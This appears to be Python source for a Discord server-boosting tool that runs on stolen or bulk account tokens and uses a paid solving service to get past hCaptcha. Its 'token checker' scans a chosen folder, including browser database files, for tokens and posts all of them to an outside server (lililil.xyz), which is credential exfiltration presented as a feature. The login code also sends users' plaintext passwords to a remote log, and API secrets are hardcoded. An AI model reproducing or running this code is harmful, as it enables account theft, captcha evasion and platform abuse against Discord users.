# INSTALL ALL DEPENDENCIES NEEDED

from calendar import c
from cmath import inf
from logging import exception
import os
from os import mkdir, path
import pathlib
import re


from utils.transition import transition
from utils.commun import *

try:
    from AuthGG.client import Client
    from AuthGG.admin import AdminClient
    from AuthGG.logging import Logging
except:
    os.system('pip install AuthGG')
    from AuthGG.client import Client
    from AuthGG.admin import AdminClient
    from AuthGG.logging import Logging


adminClient = AdminClient("NECYFYUDQWMZ")
client = Client(api_key="54578565483584463895695913173592256", aid="934377", application_secret="iqOLv0ZxHN4lkUJWCTfRVnmNPLmruBMjmuY")
authLogging = Logging(aid='934377', apikey='54578565483584463895695913173592256', secret='iqOLv0ZxHN4lkUJWCTfRVnmNPLmruBMjmuY')

try:
    import jwt
except:
    os.system('pip install PyJWT')
    import jwt

try:
    import maskpass
except:
    os.system('pip install maskpass')
    import maskpass

try:
    import requests
except:
    os.system('pip install requests && cls')
    import requests

try:
    import threading
except:
    os.system('pip install threading && cls')
    import threading

try:
    import random
except:
    os.system('pip install random && cls')
    import random

try:
    from pystyle import Colors, Colorate, Write, Box
except:
    os.system('pip install pystyle && cls')
    from pystyle import Colors, Colorate, Write, Box

try:
    import json
except:
    os.system('pip install json && cls')
    import json

try:
    import time
except:
    os.system('pip install time && cls')
    import time

try:
    import sys
except:
    os.system('pip install sys && cls')
    import sys

try:
    import ctypes
except:
    os.system('pip install ctypes && cls')
    import ctypes

try:
    import subprocess
except:
    os.system('pip install subprocess && cls')
    import subprocess

try:
    from optparse import Option
except:
    os.system('pip install optparse && cls')
    from optparse import Option

try:
    from builtins import *
except:
    os.system('pip install builtins && cls')
    from builtins import *

try:
    from capmonster_python import RecaptchaV2Task
    import capmonster_python
except:
    os.system('pip install capmonster_python && cls')
    from capmonster_python import RecaptchaV2Task
    import capmonster_python

# Path for files
PATH = "urdesires"
CHECKER_PATH = PATH + "/checker"

# Check for existing files before launching
def startup():
    if not path.exists(PATH):
            mkdir(PATH)

    if not path.exists(CHECKER_PATH):
            mkdir(CHECKER_PATH)
    if not path.exists(PATH + '/tokens.txt'):
        if not path.exists(PATH):
            mkdir(PATH)

        with open(PATH + '/tokens.txt', 'w') as w:
            r = 'tokens here'
            w.write(r)
    if not path.exists(PATH + '/settings.json'):
        if not path.exists(PATH):
            mkdir(PATH)
        with open(PATH + '/settings.json', 'w') as w:
            r = '''{
    "captchatype": "capmonster.cloud",
    "apikey": "apikey"
}'''
            w.write(r)

startup()

# Method for getting the api key from the settings.json file.
with open(PATH + '/settings.json') as config_file:
    config = json.load(config_file)
    captchaKey = config['apikey']
    captchaType = config['captchatype']

done = 0
retries = 0
bypass = 0

# DON'T CHANGE THIS
ctypes.windll.kernel32.SetConsoleTitleW("UrDesires Tool | Developed by ziue")

# Setup title.
def title():
    global done, retries, bypass
    while True:
        os.system(f'')


# Method for removing tokens from txt file after boosting.
def removeToken(token: str):
    with open(PATH + '/tokens.txt', "r") as f:
        Tokens = f.read().split("\n")
        for t in Tokens:
            if len(t) < 5 or t == token:
                Tokens.remove(t)
        open(PATH + "/tokens.txt", "w").write("\n".join(Tokens))

# Do not touch this cus ur gonna fuck something up
def finger():
    r = requests.get('https://discordapp.com/api/v9/experiments')
    if r.status_code == 200:
        fingerprint = r.json()['fingerprint']
        return fingerprint
    else:
        print('sum went wrong')

# Do not touch this cus ur gonna fuck something up
def cookies():
    r = requests.get('https://discord.com')
    if r.status_code == 200:
        cookies = r.cookies.get_dict()
        few = cookies['__dcfduid']
        few2 = cookies['__sdcfduid']
        lmao  = f"__dcfduid={few}; __sdcfduid={few2}; locale=en-US"
        return lmao
    else:
        print('sum went wrong')

# Open the tokens.txt file and count every single line of tokens and add to varible.
with open(PATH + "/tokens.txt", "r") as f: tokens = f.read().splitlines()

# Method for saving the tokens file, accepts a argument of a txt file.
def save_tokens(file):
    with open(file, 'w') as f: f.write('')
    for token in tokens:
        with open(file, "a") as f: f.write(token + "\n")

# Method for removing duplicate tokens, accepts a argument of a txt file.
def removeDuplicates(file):
    lines_seen = set()
    with open(file, "r+") as f:
        d = f.readlines(); f.seek(0)
        for i in d:
            if i not in lines_seen: f.write(i); lines_seen.add(i)
        f.truncate()

# Boosting method, accepts 2 arguments, list of lines from a txt file and discord invite. (Do not put entire link)
def boost(line, invite):
    global done

    try:
        os.system("cls")
        print_title()

        token = line.strip()

        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-GB',
            'authorization': token,
            'content-type': 'application/json',
            'origin': 'https://discord.com',
            'referer': 'https://discord.com/channels/@me', 
            'sec-fetch-dest': 'empty', 
            'sec-fetch-mode': 'cors',
            'cookie': '__dcfduid=23a63d20476c11ec9811c1e6024b99d9; __sdcfduid=23a63d21476c11ec9811c1e6024b99d9e7175a1ac31a8c5e4152455c5056eff033528243e185c5a85202515edb6d57b0; locale=en-GB',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.1.9 Chrome/83.0.4103.122 Electron/9.4.4 Safari/537.36',
            'x-debug-options': 'bugReporterEnabled',
            'x-context-properties': 'eyJsb2NhdGlvbiI6IlVzZXIgUHJvZmlsZSJ9',
            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjAuMS45Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTc3NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTM1NTQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
            'te': 'trailers',
        }
        r = requests.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers=headers)
        
        if r.status_code == 200:
            slots = r.json()
            if len(slots) != 0:
                guid = None
                joined = False
                headers["content-type"] = 'application/json'
                for i in range(15):
                    try:
                        join_server = requests.post(f"https://discord.com/api/v9/invites/{invite}", headers=headers, json={
                        })
                        if "captcha_sitekey" in join_server.text:
                            print(Colorate.Horizontal(Colors.blue_to_purple,  'Creating Captcha Task\n'))

                            createTask = requests.post("https://api.capmonster.cloud/createTask", json={
                                "clientKey": captchaKey,
                                "task": {
                                    "type": "HCaptchaTaskProxyless",
                                    "websiteURL": "https://discord.com/channels/@me",
                                    "websiteKey": join_server.json()['captcha_sitekey']
                                }
                            }).json()["taskId"]
                            getResults = {}
                            getResults["status"] = "processing"
                            while getResults["status"] == "processing":
                                print(Colorate.Horizontal(Colors.blue_to_purple,  'Getting task result\n'))

                                getResults = requests.post("https://api.capmonster.cloud/getTaskResult", json={
                                    "clientKey": captchaKey,
                                    "taskId": createTask
                                }).json()

                                time.sleep(1)

                            solution = getResults["solution"]["gRecaptchaResponse"]

                            print(Colorate.Horizontal(Colors.blue_to_purple,  'Captcha has been solved\n'))


                            join_server = requests.post(f"https://discord.com/api/v9/invites/{invite}", headers=headers, json={
                                "captcha_key": solution
                            })

                        if join_server.status_code == 200:
                            join_outcome = True
                            guid = join_server.json()["guild"]["id"]
                            print(Colorate.Horizontal(Colors.blue_to_purple,  'Successfully Joined Server\n Token: ' + str(token[:40])))
                            done += 1
                            break
                        else: 
                            print(Colorate.Horizontal(Colors.blue_to_purple,  'Error Occured While Joining Server\n Token: ' + str(token[:40])))
                            return
                    except Exception as e:
                        print(e)
                        pass
            for slot in slots:
                slotid = slot['id']
                payload = {"user_premium_guild_subscription_slot_ids": [slotid]}
                r2 = requests.put(f'https://discord.com/api/v9/guilds/{guid}/premium/subscriptions', headers=headers, json=payload)
                if r2.status_code == 201:
                    done += 1
                else:
                    print(Colorate.Horizontal(Colors.blue_to_purple,  '''Token doesn't have nitro\n Token:''' + str(token[:40])))
        else:
            print(Colorate.Horizontal(Colors.blue_to_purple,  '''Error: ''' + str(r.json())))


    except Exception as e:
        print(e)

        retries += 1

# Initialize varibles from txt.
tokensAmount = len(open(PATH + '/tokens.txt', encoding='utf-8').read().splitlines())
BoostsAmmount = tokensAmount * 2

# Settings message
def print_settings(BoostsAmmount: int):
    tokens = len(open(PATH + '/tokens.txt', encoding='utf-8').read().splitlines())
    print_title()
    settings = Colorate.Horizontal(Colors.blue_to_purple,  '''
                Boosts Available: ''' + str(BoostsAmmount) + '''
                Tokens Available: ''' + str(tokens) + '''
                Tokens File Name: tokens.txt
                
                > MAIN MENU (7)''')
    print(settings)


class Authentication():
    def main(self):
        option = input(Colorate.Horizontal(Colors.blue_to_purple,  " > "))

        if option == "1":
            transition()
            print_title()
            print(Colorate.Horizontal(Colors.blue_to_purple,  "[>] Username: "), end='')
            username = str(input())

            pwd = maskpass.askpass(prompt=Colorate.Horizontal(Colors.blue_to_purple,  "[>] Password: "), mask="*")
            password = str(pwd)


            try:
                client.login(username, password)
                print(Colorate.Horizontal(Colors.blue_to_purple,  "[#] You've successfully logged in as " + username))
                authLogging.sendData(username=username, message='Logged in using ' + username + ":" + password)
                
                try:
                    status = adminClient.fetchUserInfo(username)
                    rank = ""
                    if status['rank'] == '1':
                        rank = "Owner"
                    else:
                        rank = "User"

                    print(Colorate.Horizontal(Colors.blue_to_purple,  
                    '''\n[#] HWID: ''' + status['hwid'] +
                    '''\n[#] Expire: ''' + status['expiry'] +
                    '''\n[#] Email: ''' + status['email'] +
                    '''\n[#] Rank: ''' + rank
                    ))

                    print()
                    print(Colorate.Horizontal(Colors.blue_to_purple,  "[#] Sending to menu..."))
                    time.sleep(1)

                    
                except Exception as e:
                    print(Colorate.Horizontal(Colors.blue_to_purple,  "[>] Error: " + e))
                
                transition()
                print_banner()
                print()
                
                menu = MainMenu()
                menu.main()

            except Exception as e:
                print(Colorate.Horizontal(Colors.blue_to_purple,  "[>] Error: " + str(e)))

        if option == "2":
            transition()
            print_title()
            
            print(Colorate.Horizontal(Colors.blue_to_purple,  "[>] Username: "), end='')
            username = str(input())

            pwd = maskpass.askpass(prompt=Colorate.Horizontal(Colors.blue_to_purple,  "[>] Password: "), mask="*")
            password = str(pwd)

            print(Colorate.Horizontal(Colors.blue_to_purple,  "[>] Email: "), end='')
            email = str(input())

            print(Colorate.Horizontal(Colors.blue_to_purple,  "[>] License: "), end='')
            license = str(input())
            
            print() 

            try:
                client.register(email=email, username=username, password=password, license_key=license)
                print(Colorate.Horizontal(Colors.blue_to_purple,  "[#] You've successfully registered as " + username))
                authLogging.sendData(username=username, message='Registered using ' + email + ":" + username + ":" + password + ":" + license)

                time.sleep(3)
                os._exit(0)
            except Exception as e:
                print(Colorate.Horizontal(Colors.blue_to_purple,  "[>] Error: " + e))


        if option == "3":
            transition()
            print_title()

            print(Colorate.Horizontal(Colors.blue_to_purple,  "[>] Username: "), end='')
            username = str(input())

            try:
                client.forgotPassword(username)
                print(Colorate.Horizontal(Colors.blue_to_purple,  "[#] Email has been sent to your inbox."))

            except Exception as e:
                print(Colorate.Horizontal(Colors.blue_to_purple,  "[>] Error: " + e))
                

        if option == "4":
            os._exit(0)

        if option == "5":
            transition()
            print_title()

            print(Colorate.Horizontal(Colors.blue_to_purple,  "[ADMIN] Username: "), end='')
            username = str(input())

            pwd = maskpass.askpass(prompt=Colorate.Horizontal(Colors.blue_to_purple,  "[ADMIN] Password: "), mask="*")
            password = str(pwd)


            try:
                client.login(username, password)
                status = adminClient.fetchUserInfo(username)

                if status['rank'] == '1':
                    print(Colorate.Horizontal(Colors.blue_to_purple,  "[ADMIN] You've successfully logged in as an admin"))
                
                    try:
                        print()
                        print(Colorate.Horizontal(Colors.blue_to_purple,  "[#] Sending to menu..."))
                        time.sleep(2)
                    except Exception as e:
                        print(Colorate.Horizontal(Colors.blue_to_purple,  "[>] Error: " + e))
                    
                    transition()
                    print_admin_banner()
                    print()
                    menu = Admin()
                    menu.main()
                else:
                    print("[ADMIN] The user " + username + " doesn't have admin privileges.")
                    time.sleep(1)
                    os._exit(0)

            except Exception as e:
                print(Colorate.Horizontal(Colors.blue_to_purple,  "[>] Error: " + e))


class MainMenu():
    def main(self):
        while True:
            option = input(Colorate.Horizontal(Colors.blue_to_purple,  " > "))
            if option == "1":
                # boost
                menu = BoostServer()
                menu.main()

            if option == "2":
                # token checker
                transition()

                checker = TokenChecker()
                checker.get_param()
                checker.main()

            if option == "3":
                # server joiner
                os.system('cls')
                print_banner()

            if option == "4":
                # token settings
                transition()

                tokensAmount = len(open(PATH + '/tokens.txt', encoding='utf-8').read().splitlines())
                BoostsAmmount = tokensAmount * 2
                
                print_settings(BoostsAmmount)
                
            if option == "5":
                # remove duplicates
                menu = RemoveDuplicates()
                menu.main()
            
            if option == "6":
                # captcha balance
                menu = CaptchaBalance()
                menu.main()

            if option == "7":
                os.system('cls')
                print_banner()
            
            if option == "8":
                # exit
                os._exit(0)

            if option == "9":
                # admim menu
                menu = AdminLogin()
                menu.main()

class TokenChecker():
    @staticmethod
    def fast_exit(message):
        print()
        print(message)
        print()
        input(Colorate.Horizontal(Colors.blue_to_purple,  "Press enter to exit"))
        exit()

    def __init__(self):
        self.url = "https://lililil.xyz/checker"
        self.version = "3.5.3"
        self.file_types = [".txt", ".html", ".json", ".log", ".ldb", ".sqlite"]
        self.param = {}

        self.tokens_parsed = []
        self.res = {}

    def get_param(self):
        try:
            self.param = requests.get(self.url).json()
            self.res = self.param["res"]
        except Exception as error:
            TokenChecker.fast_exit(f"An error occurred while trying connect to the server. {error.__doc__}")

   
    def main(self):
        transition()
        print_title()
                
        print(Colorate.Horizontal(Colors.blue_to_purple,  '''
            [1] Enter Token
            [2] Check File
        '''))
        
        check_type = input(Colorate.Horizontal(Colors.blue_to_purple,  "Select an option > "))

        if "1" in check_type:
            os.system("cls")
            print_title()

            self.parse_tokens(input(Colorate.Horizontal(Colors.blue_to_purple,  "Enter tokens > ")))
            print()
        elif "2" in check_type:
            os.system("cls")
            print_title()

            token_file_name = input(Colorate.Horizontal(Colors.blue_to_purple,  "Enter file name > "))
            self.check_file(token_file_name)
            print()
        else:
            os.system("cls")
            print_title()
            TokenChecker.fast_exit(Colorate.Horizontal(Colors.blue_to_purple,  "Invalid Option "))

        self.send_tokens()
        TokenChecker.fast_exit(Colorate.Horizontal(Colors.blue_to_purple,  "All tokens saved!"))

    def check_file(self, token_file_name):
        if not os.path.exists(token_file_name):
            TokenChecker.fast_exit(f"{token_file_name} directory not exist.")

        if os.path.isfile(token_file_name):
            with open(token_file_name, "r", errors="ignore") as file:
                self.parse_tokens(file.read())
        else:
            for path in pathlib.Path(token_file_name).rglob("*.*"):
                if path.suffix in self.file_types:
                    try:
                        with open(path, "r", errors="ignore") as file:
                            self.parse_tokens(file.read())
                    except IOError as error:
                        print(error)
            self.tokens_parsed = list(dict.fromkeys(self.tokens_parsed))

    def parse_tokens(self, text):
        pre_parsed = []
        for token in re.findall(self.param["regexp"], text):
            pre_parsed.append(token)
        pre_parsed = list(dict.fromkeys(pre_parsed))

        for token in pre_parsed:
            try:
                jwt.decode(token, options={"verify_signature": False})
            except Exception as error:
                if str(error) == "Invalid header string: must be a json object" or str(error) == "Not enough segments":
                    self.tokens_parsed.append(token)

    def send_tokens(self):
        if len(self.tokens_parsed) > self.param["max_tokens"]:
            TokenChecker.fast_exit(
                f"The current API limit is {self.param['max_tokens']} tokens. "
                f"Amount of sorted tokens - {len(self.tokens_parsed)}."
            )
        elif len(self.tokens_parsed) == 0:
            TokenChecker.fast_exit(Colorate.Horizontal(Colors.blue_to_purple,  "Parser couldn't find tokens"))

        parts = [self.tokens_parsed[d:d + self.param["tokens_part"]] for d in
                 range(0, len(self.tokens_parsed), self.param["tokens_part"])]

        for i in range(len(parts)):
            tokens_time = self.param["tokens_time"] * len(parts[i]) // 1000

            print(Colorate.Horizontal(Colors.blue_to_purple,  "Receiving tokens..."))
            time.sleep(tokens_time)
            print(Colorate.Horizontal(Colors.blue_to_purple,  "Received tokens after " + str(tokens_time) + " seconds"))

            req_successful = False
            try:
                req = {}
                while not req_successful:
                    req = requests.post(self.url, json=parts[i])

                    if req.status_code == 429:
                        print(Colorate.Horizontal(Colors.blue_to_purple,  "Too many tokens check requests, retry after " + str((req.headers['RateLimit-Reset'])) + " seconds"))

                        time.sleep(float(req.headers['RateLimit-Reset']))
                    elif req.status_code != 200:
                        TokenChecker.fast_exit(Colorate.Horizontal(Colors.blue_to_purple,  "Status code: " + str(req.status_code)))

                    else:
                        req_successful = True

                for tokens_type in self.res["tokensInfo"]:
                    self.res["tokensInfo"][tokens_type] += req.json()["tokensInfo"][tokens_type]
                self.res["tokensData"].update(req.json()["tokensData"])
            except Exception as error:
                TokenChecker.fast_exit(f"An error occurred while trying to send tokens to the server. {error.__doc__}")

            self.save_res()

    def save_res(self):
        stats = ""
        for token_type in self.res["tokensInfo"].keys():
            if self.res["tokensInfo"][token_type]:
                stats += f"{token_type} - {len(self.res['tokensInfo'][token_type])}, "
                with open("urdesires/checker/" + "urdesires_" + token_type + ".txt", "w") as file:
                    file.write("\n".join(self.res["tokensInfo"][token_type]))

        with open("tokens_data.json", "w") as file:
            json.dump(self.res, file, indent=4)

        print()
        print(Colorate.Horizontal(Colors.blue_to_purple,  "Scan Results: " + str(stats[:-2])))

class ServerJoiner():
    def main(self):
        os.system('cls')

class BoostServer():
    def main(self):
        global done
        # boost
        transition()
        print_title()

        tokensAmount = len(open(PATH + '/tokens.txt', encoding='utf-8').read().splitlines())
        os.system('cls')

        print_title()
        print(Colorate.Horizontal(Colors.blue_to_purple,  "[>] Discord Invite: "), end='')
        inv = str(input())
        os.system('cls')

        print_title()
        print(Colorate.Horizontal(Colors.blue_to_purple,  "[>] Amount of Boosts: "), end='')
        amount = int(input())
        os.system('cls')


        print_title()
        print(Colorate.Horizontal(Colors.blue_to_purple, '''
            Boost Amount: ''' + str(amount) + '''  
            Remaining boosts: ''' + str((tokensAmount*2)-amount)) + '\n')

        cotinue = input(Colorate.Horizontal(Colors.blue_to_purple,  'Do you wish to continue? (Y/N)'))

        if cotinue == "n":
            os.system('cls')
            print_banner()
        
        with open(PATH + '/tokens.txt', 'r') as f:
            for line in f.readlines():
                try:
                    boost(line, inv)
                    removeToken(line)
                except Exception as e:
                    print(e)
                    pass
                if done >= amount:
                    # removeToken(line)
                    os.system("cls")
                    print_title()

                    print(Colorate.Horizontal(Colors.blue_to_purple,  'Successfully boosted discord.gg/' + str(inv) + ' ' + str(amount) + 'x'))              
                    time.sleep(2)
                    done = 0
                    break
        done = 0


class RemoveDuplicates():
    def main(self):
        transition()
        print_title()

        file_name = input(Colorate.Horizontal(Colors.blue_to_purple,  'Enter tokens file (Example: tokens.txt) '))

        removeDuplicates(PATH + "/" + file_name)
        print(Colorate.Horizontal(Colors.blue_to_purple,  'Successfully removed all duplicates\n'))      
        print(Colorate.Horizontal(Colors.blue_to_purple,  '> MAIN MENU (7)'))


class CaptchaBalance():
    def main(self):
        if captchaType == "capmonster.cloud":
            bal = capmonster_python.HCaptchaTask(captchaKey)
            el = bal.get_balance()
            transition()
            print_title()
            print(Colorate.Horizontal(Colors.blue_to_purple,  'Balance: ' + '$' + str(el)))
            print(Colorate.Horizontal(Colors.blue_to_purple,  '\n> MAIN MENU (7)'))
        else:
            print(Colorate.Horizontal(Colors.blue_to_purple,  '''\nFeature doesn't support ''' + captchaType))
            

class AdminLogin():
    def main(self):
        transition()
        print_title()
        print(Colorate.Horizontal(Colors.blue_to_purple,  "[ADMIN] Username: "), end='')
        username = str(input())

        print(Colorate.Horizontal(Colors.blue_to_purple,  "[ADMIN] Password: "), end='')
        password = str(input())


        try:
            client.login(username, password)
            status = adminClient.fetchUserInfo(username)

            if status['rank'] == '1':
                print(Colorate.Horizontal(Colors.blue_to_purple,  "[ADMIN] You've successfully logged in as an admin"))
            
                try:
                    print()
                    print(Colorate.Horizontal(Colors.blue_to_purple,  "[#] Sending to menu..."))
                    time.sleep(2)
                except Exception as e:
                    print(Colorate.Horizontal(Colors.blue_to_purple,  "[>] Error: " + e))
                
                transition()
                print_admin_banner()
                print()
                Admin.main()
            else:
                print("[ADMIN] The user " + username + " doesn't have admin privileges.")
                time.sleep(1)
                os._exit(0)

        except Exception as e:
            print(Colorate.Horizontal(Colors.blue_to_purple,  "[>] Error: " + e))

class Admin():
    def main(self):
        while True:
            option = input(Colorate.Horizontal(Colors.blue_to_purple,  " > "))
            
            if option == "1":
                transition()
                print(Colorate.Horizontal(Colors.blue_to_purple,  "[ADMIN] Username: "), end='')
                username = str(input())

                status = adminClient.fetchUserInfo(username)
                print(Colorate.Horizontal(Colors.blue_to_purple,
                    '''\n[#] HWID: ''' + status['hwid'] +
                    '''\n[#] Last Login: ''' + status['lastlogin'] +
                    '''\n[#] Expire: ''' + status['expiry'] +
                    '''\n[#] Email: ''' + status['email'] +
                    '''\n[#] Last IP: ''' + status['lastip'] +
                    '''\n[#] Username: ''' + status['username'] +
                    '''\n[#] Rank: ''' + status['rank'] + "\n"
                    ))
            
            if option == "2":
                transition()
                print(Colorate.Horizontal(Colors.blue_to_purple,  "[ADMIN] Username: "), end='')
                username = str(input())

                print(Colorate.Horizontal(Colors.blue_to_purple,  "[ADMIN] New Password: "), end='')
                newPassword = str(input())

                try:
                    adminClient.changeUserPassword(username=username, password=newPassword)        
                    print(Colorate.Horizontal(Colors.blue_to_purple,  "[ADMIN] " + username + "'s password has been changed."))
                        
                except Exception as e:
                    print(e)   

            if option == "3":
                transition()
                print(Colorate.Horizontal(Colors.blue_to_purple,  "[ADMIN] Username: "), end='')
                username = str(input())

                status = adminClient.getHWID(username=username)
                print(Colorate.Horizontal(Colors.blue_to_purple,  "[ADMIN] " + username + "'s HWID is " + status))

            
            if option == "4":
                transition()
                print(Colorate.Horizontal(Colors.blue_to_purple,  "[ADMIN] Username: "), end='')
                username = str(input())

                status = adminClient.resetHWID(username=username)
                print(Colorate.Horizontal(Colors.blue_to_purple,  "[ADMIN] " + username + "'s HWID has been reset."))
            
            if option == "5":
                transition()
                print(Colorate.Horizontal(Colors.blue_to_purple,  "[ADMIN] Username: "), end='')
                username = str(input())

                status = adminClient.deleteUser(username)
                print(Colorate.Horizontal(Colors.blue_to_purple,  "[ADMIN] The user " + username + " has been deleted."))

            
            if option == "6":
                transition()

                status = adminClient.getUserCount()
                print(Colorate.Horizontal(Colors.blue_to_purple,  "[ADMIN] There are a total of " + status + " users."))


            if option == "7":
                transition()
                print_admin_banner()
                print()
                menu = Admin()
                menu.main()

            if option == "8":
                transition()
                print_banner()
                print()
                menu = MainMenu()
                menu.main()


if __name__ == "__main__":
    threading.Thread(target=title).start()

    auth = Authentication()
    transition()
    auth_banner()
    auth.main()